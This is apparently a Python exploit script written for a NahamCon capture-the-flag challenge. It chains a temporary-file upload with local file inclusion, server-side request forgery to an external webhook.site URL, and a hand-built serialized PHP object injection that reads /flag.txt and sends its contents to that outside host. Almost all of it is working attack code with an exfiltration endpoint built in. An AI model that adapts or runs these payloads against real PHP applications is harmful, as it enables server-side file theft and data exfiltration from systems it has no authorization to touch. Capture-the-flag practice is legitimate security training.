import requests
import re
import time
import sys

# --- Configuration ---
TARGET_HOST = "http://challenge.nahamcon.com:31970"
API_TEST_URL = f"{TARGET_HOST}/test"

# IMPORTANT: Replace this with YOUR unique webhook.site or Burp Collaborator URL.
# This URL will receive data if the SSRF tests are successful.
EXFILTRATION_BASE_URL = "http://webhook.site/ca37b88b-97e0-43c2-add7-aabac600d897@emailhook.site" # <--- **CHANGE THIS**

# PHP payload to be written to a temporary file for the LFI test.
# This payload will attempt to read /flag.txt.
PHP_LFI_PAYLOAD = b'<?php echo file_get_contents("/flag.txt"); ?>'

# File to read for the POI + SSRF Exfiltration test.
# Starting with /flag.txt, but /etc/passwd is a good fallback for testing general file read.
FILE_TO_EXFILTRATE = "/flag.txt"


# --- Helper Function for PHP Object Serialization (POI Payload Generation) ---
# This function creates the serialized string for APICaller object
# with the desired path_tmp.
def generate_apicaller_poi_payload(target_path_tmp: str, id_value: str = "poi_id") -> bytes:
    """
    Generates a PHP serialized string for the APICaller class,
    setting the private $path_tmp property to the specified value.
    """
    # PHP private property names are prefixed with null bytes and class name.
    # e.g., "\0ClassName\0propertyName"
    # In Python bytes, \x00 represents a null byte.
    class_name_len = len("APICaller")
    url_len = len("http://localhost/api/")
    path_tmp_len = len(target_path_tmp)
    id_len = len(id_value)

    # Manual construction of the serialized string bytes for robustness
    # O:10:"APICaller":3:{s:6:"\0APICaller\0url";s:20:"http://localhost/api/";s:11:"\0APICaller\0path_tmp";s:1:"/";s:7:"\0APICaller\0id";s:8:"poi_user";}
    serialized_payload = b"O:%d:\"%s\":3:{" % (class_name_len, b"APICaller")
    serialized_payload += b"s:%d:\"\x00%s\x00url\";s:%d:\"%s\";" % (class_name_len + 1 + len("url"), b"APICaller", url_len, b"http://localhost/api/")
    serialized_payload += b"s:%d:\"\x00%s\x00path_tmp\";s:%d:\"%s\";" % (class_name_len + 1 + len("path_tmp"), b"APICaller", path_tmp_len, target_path_tmp.encode('utf-8'))
    serialized_payload += b"s:%d:\"\x00%s\x00id\";s:%d:\"%s\";}" % (class_name_len + 1 + len("id"), b"APICaller", id_len, id_value.encode('utf-8'))

    return serialized_payload

# --- Test 1: Temporary File Upload & Local File Inclusion (LFI) ---
def test_temp_file_lfi():
    print("\n" + "="*70)
    print("--- Test 1: Temporary File Upload & LFI (guessing filename) ---")
    print("    Attempts to 'upload' a file and then read it using @/tmp/phpXXXXXX.")
    print("    Requires the server to leak the temporary filename in the response.")
    print("="*70)

    temp_filename = None
    try:
        # Step 1.1: Send payload as a temporary file via multipart/form-data
        print("[+] Sending payload as a temporary file...")
        files_for_upload = {
            'userid': (None, 'lfi_user_id'),
            'method': (None, 'lfi_method'),
            'parameters': ('exploit_payload.php', PHP_LFI_PAYLOAD, 'application/x-php')
        }
        upload_response = requests.post(API_TEST_URL, files=files_for_upload, timeout=10)
        print(f"    Upload Status Code: {upload_response.status_code}")
        print(f"    Upload Response Body (first 500 chars):\n{upload_response.text[:500]}...")

        # Step 1.2: Attempt to find the temporary filename in the response
        temp_file_match = re.search(r'/tmp/php[a-zA-Z0-9]{6}', upload_response.text)
        if temp_file_match:
            temp_filename = temp_file_match.group(0)
            print(f"\n[+] SUCCESS: Found potential temporary filename: {temp_filename}")

            # Step 1.3: Attempt to read the identified temporary file
            print(f"[+] Attempting to read temporary file: {temp_filename}")
            read_data = {
                'userid': 'lfi_user_id',
                'method': 'read_temp_file', # Any method name
                'parameters': f'@{temp_filename}'
            }
            read_response = requests.post(API_TEST_URL, data=read_data, timeout=10)
            print(f"    Read Status Code: {read_response.status_code}")
            print(f"    Read Response Body:\n{read_response.text}")

            if b"flag{" in read_response.content or b"<?php echo" in read_response.content:
                print("\n[!!!] Test 1: SUCCESS - Flag or payload content potentially retrieved!")
            else:
                print("\n[-] Test 1: Partial Success (filename found) but content not as expected.")
        else:
            print("\n[-] Test 1: FAILED - Temporary filename NOT found in response.")
            print("    Manual inspection, brute-forcing, or other info disclosure might be needed.")

    except requests.exceptions.RequestException as e:
        print(f"\n[!] Test 1: An error occurred: {e}")

# --- Test 2: External Server-Side Request Forgery (SSRF) Test ---
def test_external_ssrf():
    print("\n" + "="*70)
    print("--- Test 2: External SSRF Capability Check ---")
    print("    Attempts to make the server send a request to your external URL.")
    print("    YOU MUST VERIFY this by checking your webhook.site/collaborator logs.")
    print("="*70)

    if not EXFILTRATION_BASE_URL or "YOUR_UNIQUE_ID" in EXFILTRATION_BASE_URL:
        print("[!] SKIPPING Test 2: EXFILTRATION_BASE_URL is not configured.")
        print("    Please update EXFILTRATION_BASE_URL in the script with your unique URL.")
        return

    ssrf_test_url = f"{EXFILTRATION_BASE_URL}/ssrf_test_{int(time.time())}"
    print(f"[+] Attempting to trigger SSRF to: {ssrf_test_url}")

    ssrf_data = {
        'userid': 'ssrf_user_id',
        'method': ssrf_test_url, # Redirecting cURL to our external URL
        'parameters': 'ssrf_payload_test'
    }

    try:
        response = requests.post(API_TEST_URL, data=ssrf_data, timeout=10)
        print(f"    SSRF Test Status Code: {response.status_code}")
        print(f"    SSRF Test Response Body (first 500 chars):\n{response.text[:500]}...")
        print(f"\n[+] Check your external server ({EXFILTRATION_BASE_URL}) for a hit at {ssrf_test_url}.")
        print("    If you see a request there, external SSRF is possible.")
        print("    [!] Test 2: Manual verification required for SUCCESS/FAILURE.")

    except requests.exceptions.RequestException as e:
        print(f"\n[!] Test 2: An error occurred during SSRF attempt: {e}")

# --- Test 3: PHP Object Injection (POI) + Arbitrary File Read + SSRF Exfiltration ---
def test_poi_ssrf_exfil():
    print("\n" + "="*70)
    print("--- Test 3: PHP Object Injection (POI) + SSRF Exfiltration ---")
    print("    Attempts to inject a serialized APICaller object to control $path_tmp,")
    print("    read a target file (e.g., /flag.txt), and exfiltrate its content via SSRF.")
    print("    YOU MUST VERIFY this by checking your webhook.site/collaborator logs.")
    print("="*70)

    if not EXFILTRATION_BASE_URL or "YOUR_UNIQUE_ID" in EXFILTRATION_BASE_URL:
        print("[!] SKIPPING Test 3: EXFILTRATION_BASE_URL is not configured.")
        print("    Please update EXFILTRATION_BASE_URL in the script with your unique URL.")
        return

    # Generate the serialized APICaller object with path_tmp set to root '/'
    poi_payload_bytes = generate_apicaller_poi_payload(target_path_tmp="/")
    print(f"[+] Generated POI Payload (first 100 bytes): {poi_payload_bytes[:100]}...")

    exfil_endpoint = f"{EXFILTRATION_BASE_URL}/exfil_flag_{int(time.time())}"
    print(f"[+] Exfiltration endpoint for this test: {exfil_endpoint}")

    # Prepare data for POI + SSRF exfil.
    # The 'userid' field gets the serialized object.
    # The 'method' field gets the exfiltration URL.
    # The 'parameters' field triggers the file read using the '@' prefix,
    # which will use our controlled path_tmp.
    poi_ssrf_data = {
        'userid': (None, poi_payload_bytes), # Send as bytes for correct null byte handling
        'method': (None, exfil_endpoint),
        'parameters': (None, f'@{FILE_TO_EXFILTRATE}')
    }

    try:
        # Use 'files' parameter to send multipart/form-data for all fields,
        # ensuring the serialized object and file path are handled correctly.
        response = requests.post(API_TEST_URL, files=poi_ssrf_data, timeout=10)
        print(f"    POI+SSRF Status Code: {response.status_code}")
        print(f"    POI+SSRF Response Body (first 500 chars):\n{response.text[:500]}...")

        print(f"\n[+] Check your external server ({EXFILTRATION_BASE_URL}) for a hit at {exfil_endpoint}.")
        print(f"    If successful, the content of {FILE_TO_EXFILTRATE} should be in the POST data received.")
        print("    [!] Test 3: Manual verification required for SUCCESS/FAILURE.")

    except requests.exceptions.RequestException as e:
        print(f"\n[!] Test 3: An error occurred: {e}")

# --- Main Execution Flow ---
if __name__ == "__main__":
    print(f"Starting comprehensive exploit tests against {TARGET_HOST}")

    # Run Test 1
    test_temp_file_lfi()

    # Pause for a moment before next test, if needed for rate limiting or clarity
    # time.sleep(2)

    # Run Test 2
    test_external_ssrf()

    # Pause for a moment
    # time.sleep(2)

    # Run Test 3 (depends on successful external SSRF)
    test_poi_ssrf_exfil()

    print("\nAll tests completed.")